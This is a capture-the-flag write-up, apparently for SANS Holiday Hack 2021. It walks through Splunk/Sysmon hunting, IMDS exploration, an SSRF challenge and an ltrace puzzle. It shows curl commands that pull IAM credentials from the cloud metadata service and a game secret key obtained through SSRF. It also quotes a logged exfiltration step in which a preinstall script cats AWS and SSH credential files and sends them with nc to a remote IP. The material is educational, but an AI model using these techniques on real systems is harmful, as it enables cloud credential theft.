<a class=header-link href=#task-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>git status</code>.</p><blockquote><p>Capture the commands Eddie ran most often, starting with git. Looking only at
his process launches as reported by Sysmon, record the most common git-related
CommandLine that Eddie seemed to use.</p></blockquote><ol><li>Click the 2nd link <code>Sysmon for Linux - Process creation</code>.</li><li>Select <code>ParentUser</code> in the left sidebar and select <code>eddie</code>.</li><li>Click on <code>CommandLine</code> in the left sidebar and see the top values.</li></ol><p>Answer is <code>git status</code>.</p><h3 id=task-2>Task 2
<a class=header-link href=#task-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>git@github.com:elfnp3/partnerapi.git</code>.</p><blockquote><p>Looking through the git commands Eddie ran, determine the remote repository
that he configured as the origin for the 'partnerapi' repo. The correct one!</p></blockquote><p>We will add <code>CommandLine=*add*origin*</code> to the previous search to only return
command-lines with <code>add</code> and <code>origin</code> in them. There are two commands:</p><pre tabindex=0><code>git remote add origin https://github.com/elfnp3/partnerapi.git

git remote add origin git@github.com:elfnp3/partnerapi.git
</code></pre><p>The answer is <code>git@github.com:elfnp3/partnerapi.git</code> (I tried the HTTPs URL and
it did not work).</p><h3 id=task-3>Task 3
<a class=header-link href=#task-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>docker compose up</code>.</p><blockquote><p>The 'partnerapi' project that Eddie worked on uses Docker. Gather the full
docker command line that Eddie used to start the 'partnerapi' project on his
workstation.</p></blockquote><p>We modify previous search with <code>CommandLine=*docker*</code>. There are 14 results.
Click on <code>CommandLine</code> in the sidebar to see the command. We want
<code>docker compose up</code>.</p><h3 id=task-4>Task 4
<a class=header-link href=#task-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>https://github.com/snoopysecurity/dvws-node</code>.</p><blockquote><p>Eddie had been testing automated static application security testing (SAST) in
GitHub. Vulnerability reports have been coming into Splunk in JSON format via
GitHub webhooks. Search all the events in the main index in Splunk and use the
sourcetype field to locate these reports. Determine the URL of the vulnerable
GitHub repository that the elves cloned for testing and document it here. You
will need to search outside of Splunk (try GitHub) for the original name of
the repository.</p></blockquote><p>I cheated. We know the repository in task 2 was <code>elfnp3/partnerapi.git</code> so I
just went to <a href=https://github.com/elfnp3 target=_blank rel="noreferrer noopener">https://github.com/elfnp3</a> and saw a fork named
<code>dvws-node</code>. The original repository is
<a href=https://github.com/snoopysecurity/dvws-node target=_blank rel="noreferrer noopener">https://github.com/snoopysecurity/dvws-node</a>.</p><h3 id=task-5>Task 5
<a class=header-link href=#task-5><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>holiday-utils-js</code>.</p><blockquote><p>Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi'
project. Determine the name of the library and record it here for our workshop
documentation.</p></blockquote><ol><li>Click the 2nd link <code>Sysmon for Linux - Process creation</code>.</li><li>Select <code>ParentUser</code> in the left sidebar and select <code>eddie</code>.</li><li>Add <code>CommandLine=*package.json*</code> to the search term.</li><li>Click on <code>CommandLine</code> to see
<code>git commit package.json -m Added holiday-utils-js dependency</code>.</li></ol><h3 id=task-6>Task 6
<a class=header-link href=#task-6><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>/usr/bin/nc.openbsd</code>.</p><blockquote><p>Another elf started gathering a baseline of the network activity that Eddie
generated. Start with their search and capture the full process_name field of
anything that looks suspicious.</p></blockquote><p>Click on <code>their search</code> and there are three total results with two <code>dest_ip</code>s:</p><ul><li><code>192.30.255.113</code>: <code>process_name</code> for both is <code>/usr/bin/git</code>.</li><li><code>54.175.69.219</code>: <code>process_name</code> is <code>/usr/bin/nc.openbsd</code> that we got from the hint.</li></ul><h3 id=task-7>Task 7
<a class=header-link href=#task-7><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>6</code>.</p><blockquote><p>Uh oh. This documentation exercise just turned into an investigation. Starting
with the process identified in the previous task, look for additional
suspicious commands launched by the same parent process. One thing to know
about these Sysmon events is that Network connection events don't indicate the
parent process ID, but Process creation events do! Determine the number of
files that were accessed by a related process and record it here.</p></blockquote><ol><li>Click on sample 2 <code>Sysmon for Linux - Process creation</code>.</li><li>Add <code>process_name="/usr/bin/nc.openbsd"</code>.One result.</li><li>Click on <code>ParentProcessId</code> or <code>parent_process_id</code> and see <code>6788</code>.<ol><li>Now we need to search for all processes with this parent.</li></ol></li><li>Remove the previous query and add <code>ParentProcessId=6788</code>. Two results</li><li>Click on <code>CommandLine</code> in the left sidebar.<ol><li><code>nc -q1 54.175.69.219 16842</code>: Not what we want.</li><li><code>cat ...</code> is the answer. Six files were accessed.</li></ol></li></ol><pre tabindex=0><code>cat
   /home/eddie/.aws/credentials
   /home/eddie/.ssh/authorized_keys
   /home/eddie/.ssh/config
   /home/eddie/.ssh/eddie
   /home/eddie/.ssh/eddie.pub
   /home/eddie/.ssh/known_hosts
</code></pre><h3 id=task-8>Task 8
<a class=header-link href=#task-8><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Answer: <code>preinstall.sh</code>.</p><blockquote><p>Use Splunk and Sysmon Process creation data to identify the name of the Bash
script that accessed sensitive files and (likely) transmitted them to a remote
IP address.</p></blockquote><p>Adding <code>CommandLine=*.sh*</code> does not return anything good. Trying the files in
the previous task also only return the <code>cat</code> command that we've already seen.</p><ol><li>Click on sample 2 <code>Sysmon for Linux - Process creation</code>.</li><li>Select user <code>eddie</code>.</li><li>Click on <code>process_name</code> and select <code>/usr/bin/bash</code>.</li><li>Click on <code>CommandLine</code> and see <code>/bin/bash preinstall.sh</code></li></ol><blockquote><p>Thank you for helping Santa complete his investigation! Santa says you're a
whiz!</p></blockquote><hr><h1 id=10-now-hiring>10) Now Hiring!
<a class=header-link href=#10-now-hiring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>What is the secret access key for the
<a href=https://apply.jackfrosttower.com/ target=_blank rel="noreferrer noopener">Jack Frost Tower job applications > server</a>? Brave the perils of
Jack's bathroom to get hints from Noxious O. D'or.</p></blockquote><h2 id=noxious-o-dor---imds-exploration>Noxious O. D'or - IMDS Exploration
<a class=header-link href=#noxious-o-dor---imds-exploration><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Teleport <code>FrostFest > Jack's Restroom</code>.</p><blockquote><p>You know, I'm having some trouble with this IMDS exploration. I'm hoping you
can give me some help in solving it.</p><p>If you do, I'll be happy to trade you for some hints on SSRF! I've been
studying up on that and have some good ideas on how to attack it!</p></blockquote><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ ping <span style=color:#2aa198>169.254</span>.<span style=color:#2aa198>169.254</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>latest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>dynamic
</span></span><span style=display:flex><span>meta-data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/dynamic
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>fws/instance-monitoring
</span></span><span style=display:flex><span>instance-identity/document
</span></span><span style=display:flex><span>instance-identity/pkcs<span style=color:#2aa198>7</span>
</span></span><span style=display:flex><span>instance-identity/signature
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/dynamic/instance-identity/document
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;accountId&#34;</span>: <span style=color:#2aa198>&#34;PCRVQVHN4S0L4V2TE&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;imageId&#34;</span>: <span style=color:#2aa198>&#34;ami-0b69ea66ff7391e80&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;availabilityZone&#34;</span>: <span style=color:#2aa198>&#34;np-north-1f&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ramdiskId&#34;</span>: <span style=color:#cb4b16>null</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;kernelId&#34;</span>: <span style=color:#cb4b16>null</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;devpayProductCodes&#34;</span>: <span style=color:#cb4b16>null</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;marketplaceProductCodes&#34;</span>: <span style=color:#cb4b16>null</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;version&#34;</span>: <span style=color:#2aa198>&#34;2017-09-30&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;privateIp&#34;</span>: <span style=color:#2aa198>&#34;10.0.7.10&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;billingProducts&#34;</span>: <span style=color:#cb4b16>null</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;instanceId&#34;</span>: <span style=color:#2aa198>&#34;i-1234567890abcdef0&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;pendingTime&#34;</span>: <span style=color:#2aa198>&#34;2021-12-01T07:02:24Z&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;architecture&#34;</span>: <span style=color:#2aa198>&#34;x86_64&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;instanceType&#34;</span>: <span style=color:#2aa198>&#34;m4.xlarge&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;region&#34;</span>: <span style=color:#2aa198>&#34;np-north-1&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/dynamic/instance-identity/document | jq
</span></span></span><span style=display:flex><span><span style=color:#586e75>// same as above
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/meta-data
</span></span></span><span style=display:flex><span><span style=color:#586e75>// removed
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>product-codes
</span></span><span style=display:flex><span>public-hostname
</span></span><span style=display:flex><span>public-ipv<span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>public-keys/<span style=color:#2aa198>0</span>/openssh-key
</span></span><span style=display:flex><span>reservation-id
</span></span><span style=display:flex><span>security-groups
</span></span><span style=display:flex><span>services/domain
</span></span><span style=display:flex><span>services/partition
</span></span><span style=display:flex><span>spot/instance-action
</span></span><span style=display:flex><span>spot/termination-time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/meta-data/public-hostname
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>ec<span style=color:#2aa198>2-192-0-2-54</span>.compute<span style=color:#2aa198>-1</span>.amazonaws.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/meta-data/public-hostname ; echo
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/meta-data/iam/security-credentials ; echo
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>elfu-deploy-role
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl http:<span style=color:#586e75>//169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role ; echo
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;Code&#34;</span>: <span style=color:#2aa198>&#34;Success&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;LastUpdated&#34;</span>: <span style=color:#2aa198>&#34;2021-12-02T18:50:40Z&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;Type&#34;</span>: <span style=color:#2aa198>&#34;AWS-HMAC&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;AccessKeyId&#34;</span>: <span style=color:#2aa198>&#34;...&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;SecretAccessKey&#34;</span>: <span style=color:#2aa198>&#34;...&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;Token&#34;</span>: <span style=color:#2aa198>&#34;...&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;Expiration&#34;</span>: <span style=color:#2aa198>&#34;2026-12-02T18:50:40Z&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cat gettoken.sh 
</span></span><span style=display:flex><span>TOKEN=`curl -X PUT <span style=color:#2aa198>&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style=color:#2aa198>&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span>`
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ source gettoken.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ echo $TOKEN
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl -H <span style=color:#2aa198>&#34;X-aws-ec2-metadata-token: $TOKEN&#34;</span> http:<span style=color:#586e75>//169.254.169.254/latest/meta-data/placement/region ; echo
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>np-north<span style=color:#2aa198>-1</span>
</span></span></code></pre></div><p>Hint from Noxious</p><blockquote><p>Cloud assets are interesting targets for attackers. Did you know they
automatically get IMDS access?</p><p>I'm very concerned about the combination of SSRF and IMDS access.</p><p>Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks?</p><p>Dr. Petabyte told us, "anytime you see URL as an input, test for SSRF."</p><p>With an SSRF attack, we can make the server request a URL. This can reveal
valuable data!</p><p>The <a href=https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html target=_blank rel="noreferrer noopener">AWS documentation for IMDS</a> is interesting reading.</p></blockquote><h2 id=now-hiring>Now Hiring!
<a class=header-link href=#now-hiring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>After navigating to <a href="https://apply.jackfrosttower.com/?p=opportunities" target=_blank rel="noreferrer noopener">https://apply.jackfrosttower.com/?p=opportunities</a> none of
the images can be displayed.</p><p>Looking the request in Burp we see they are retrieving the IMDS responses we saw
in the terminal challenge.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ https:<span style=color:#586e75>//apply.jackfrosttower.com/images/1.jpg
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>dynamic
</span></span><span style=display:flex><span>meta-data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>All three have the same response
</span></span><span style=display:flex><span>https:<span style=color:#586e75>//apply.jackfrosttower.com/images/2.jpg
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>https:<span style=color:#586e75>//apply.jackfrosttower.com/images/3.jpg
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>https:<span style=color:#586e75>//apply.jackfrosttower.com/images/4.jpg
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;Code&#34;</span>: <span style=color:#2aa198>&#34;Success&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;LastUpdated&#34;</span>: <span style=color:#2aa198>&#34;2021-05-02T18:50:40Z&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;Type&#34;</span>: <span style=color:#2aa198>&#34;AWS-HMAC&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;AccessKeyId&#34;</span>: <span style=color:#2aa198>&#34;AKIA5HMBSK1SYXYTOXX6&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;SecretAccessKey&#34;</span>: <span style=color:#2aa198>&#34;CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;Token&#34;</span>: <span style=color:#2aa198>&#34;NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&#34;Expiration&#34;</span>: <span style=color:#2aa198>&#34;2026-05-02T18:50:40Z&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Which is the answer <code>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</code>.</p><p>The <code>Apply</code> page is a normal form. The only thing is the default text in a field
which is this URL: <a href=http://nppd.northpolechristmastown.com/NLBI/YourReportIdGoesHere target=_blank rel="noreferrer noopener">http://nppd.northpolechristmastown.com/NLBI/YourReportIdGoesHere</a></p><p><a href=http://nppd.northpolechristmastown.com/needhelp target=_blank rel="noreferrer noopener">http://nppd.northpolechristmastown.com/needhelp</a> is the page for the North Pole
Police Department.</p><p>Infractions are here: <a href=http://nppd.northpolechristmastown.com/infractions target=_blank rel="noreferrer noopener">http://nppd.northpolechristmastown.com/infractions</a></p><hr><h1 id=11-customer-complaint-analysis>11) Customer Complaint Analysis
<a class=header-link href=#11-customer-complaint-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>Flud Hagg Yaqh</code>.</p><blockquote><p>A human has accessed the Jack Frost Tower network with a non-compliant host.
Which three trolls complained about the human?
Enter the troll names in alphabetical order separated by spaces. Talk to
Tinsel Upatree in the kitchen for hints.</p></blockquote><p>This is what Pat Tronizer was talking about.</p><h2 id=pat-tronizer>Pat Tronizer
<a class=header-link href=#pat-tronizer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Using the Frostavator we can click the <code>Talks</code> button.</p><p>We see Pat Tronizer there:</p><blockquote><p>Anyway, I cannot believe an actual human connected to the Tower network. It's
supposed to be the domain of us trolls and of course Jack Frost himself.</p><p>Mr. Frost has a strict policy: all devices must be <a href=https://datatracker.ietf.org/doc/html/rfc3514 target=_blank rel="noreferrer noopener">RFC3514</a>
compliant. It fits in with our nefarious plans.</p><p>Some human had the nerve to use our complaint website to submit a complaint!</p><p>That website is for trolls to complain about guests, NOT the other way around.</p></blockquote><p>RFC3514 is the security flag in the IPv4 header.</p><p>There's a pcap file to look at.</p><h2 id=tinsel-upatree---strace-ltrace-retrace>Tinsel Upatree - Strace Ltrace Retrace
<a class=header-link href=#tinsel-upatree---strace-ltrace-retrace><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Answer: A file named <code>registration.json</code> with content <code>Registration: True</code>.</p><p>Tinsel is in the kitchen. The kitchen can be accessed from the dining room which
is the door in the left of the lobby.</p><blockquote><p>Well, regardless – and more to the point, what do you know about tracing
processes in Linux?</p><p>We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we
seem to be missing a file.</p><p>Do you think you can use strace or ltrace to help us rebuild the missing
config?</p><p>And, if you help me with this, I'll give you some hints about using Wireshark
filters to look for unusual options that might help you achieve Objectives
here at the North Pole.</p></blockquote><pre tabindex=0><code>$ ls
make_the_candy*

$ ./make_the_candy 
Unable to open configuration file.
</code></pre><p>I wrote some stuff about configuring <code>ltrace</code> in 2015 at
<a href=/blog/2015-01-06-tales-from-the-crypto-leaking-aes-keys/#23--using-ltrace-to-find-the-key title="Tales from the Crypt(o) - Leaking AES Keys - Using ltrace to Find the Key" rel=nofollow target=_blank>Tales from the Crypt(o) - Leaking AES Keys - Using ltrace to Find the Key</a></p><pre tabindex=0><code>$ ltrace ./make_the_candy 
fopen(&#34;registration.json&#34;, &#34;r&#34;)          = 0
puts(&#34;Unable to open configuration fil&#34;...Unable to open configuration file.) = 35
+++ exited (status 1) +++
</code></pre><p>It's looking for <code>registration.json</code>. Let's create such a file and try again.</p><pre tabindex=0><code>$ ltrace ./make_the_candy 

fopen(&#34;registration.json&#34;, &#34;r&#34;)          = 0x55fd94d15260
getline(0x7ffc624d4510, 0x7ffc624d4518, 0x55fd94d15260, 0x7ffc624d4518) = -1
puts(&#34;Unregistered - Exiting.&#34;Unregistered - Exiting.)          = 24
+++ exited (status 1) +++
</code></pre><p><code>getline</code> reads one line and because our file is empty, we are not registered.
There's no <code>strings</code> here so we cannot figure out if it's looking for a specific
string here. That said, we can always use the vim and xxd trick we used before.
I did not see any strings here even <code>registration</code>.</p><p>Let's put <code>123456</code> in the file and see what happens.</p><pre tabindex=0><code>$ ltrace ./make_the_candy 

fopen(&#34;registration.json&#34;, &#34;r&#34;)                           = 0x5593f3271260
getline(0x7ffc23db76a0, 0x7ffc23db76a8, 0x5593f3271260, 0x7ffc23db76a8) = 7
strstr(&#34;123456\n&#34;, &#34;Registration&#34;)                        = nil
getline(0x7ffc23db76a0, 0x7ffc23db76a8, 0x5593f3271260, 0x7ffc23db76a8) = -1
puts(&#34;Unregistered - Exiting.&#34;Unregistered - Exiting.)                  = 24
+++ exited (status 1) +++
</code></pre><p>So it's looking for <code>Registration</code> in the file, see <code>strstr</code>. Let's put it there
and try again.</p><pre tabindex=0><code>strstr(&#34;Registration\n&#34;, &#34;Registration&#34;)                  = &#34;Registration\n&#34;
strchr(&#34;Registration\n&#34;, &#39;:&#39;)                             = nil
</code></pre><p><code>strchr</code> wants to find <code>:</code> in the string. Let's put <code>Registration:123456</code> in the
file.</p><pre tabindex=0><code>strstr(&#34;Registration:123456\n&#34;, &#34;Registration&#34;)           = &#34;Registration:123456\n&#34;
strchr(&#34;Registration:123456\n&#34;, &#39;:&#39;)                      = &#34;:123456\n&#34;
strstr(&#34;:123456\n&#34;, &#34;True&#34;)                               = nil
